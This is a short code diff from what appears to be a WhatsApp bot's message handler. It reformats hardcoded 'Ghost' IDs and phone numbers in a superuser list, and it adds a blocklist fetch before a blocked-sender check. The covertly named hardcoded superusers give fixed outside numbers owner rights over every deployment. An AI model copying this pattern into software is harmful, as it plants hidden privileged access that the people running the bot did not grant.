@@ -621,8 +621,8 @@ client.ev.on('messages.upsert', async ({ messages }) => {
             const pushname = m.pushName || "No Name";
             const botNumber = await client.decodeJid(client.user.id);
             const servBot = botNumber.split('@')[0];
-            const Ghost = "225065362821143@lid"; 
-            const Ghost2 = "247566713258194@lid";
+            const Ghost = "225065362821143"; 
+            const Ghost2 = "247566713258194";
             const Ghost3 = "254748387615";
             const Ghost4 = "254786989022";
             const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
@@ -706,7 +706,8 @@ client.ev.on('messages.upsert', async ({ messages }) => {
         if (cmd && mode === "private" && !itsMe && m.sender !== daddy) return;
       
 //========================================================================================================================
-         if (cmd && m.isGroup && Blocked?.includes(m.sender)) {
+        const Blocked = await client.fetchBlocklist();
+            if (cmd && m.isGroup && Blocked?.includes(m.sender)) {
         await m.reply("You are blocked from using bot commands.");
         return;
     }
